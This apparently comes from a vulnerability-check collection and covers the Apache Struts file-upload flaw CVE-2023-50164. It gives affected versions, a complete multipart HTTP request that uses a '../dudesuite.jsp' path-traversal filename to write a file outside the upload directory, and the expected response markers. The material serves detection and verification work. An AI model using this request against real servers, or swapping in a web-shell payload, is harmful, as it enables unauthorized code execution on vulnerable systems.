# Apache Struts RCE CVE-2023-50164

> 更新时间：2024-01-15

> 漏洞编号：CVE-2023-50164

> 漏洞说明：由于 Struts 框架在处理参数名称大小写方面的不一致性，导致未经身份验证的远程攻击者能够通过修改参数名称的大小写来利用目录遍历技术上传恶意文件到服务器的非预期位置，最终导致代码执行。影响版本: 2.0.0<= Struts <= 2.3.37 2.5.0 <= Struts <= 2.5.32 6.0.0 <= Struts <= 6.3.0

> 漏洞特征：

> 验证脚本：HTTP

```
POST /upload.action HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="1.txt"
Content-Type: text/plain

dudesuite
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="uploadFileName";
Content-Type: text/plain

../dudesuite.jsp
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesuite.jsp


> 验证文件来源：Apache Struts RCE CVE-2023-50164.poc
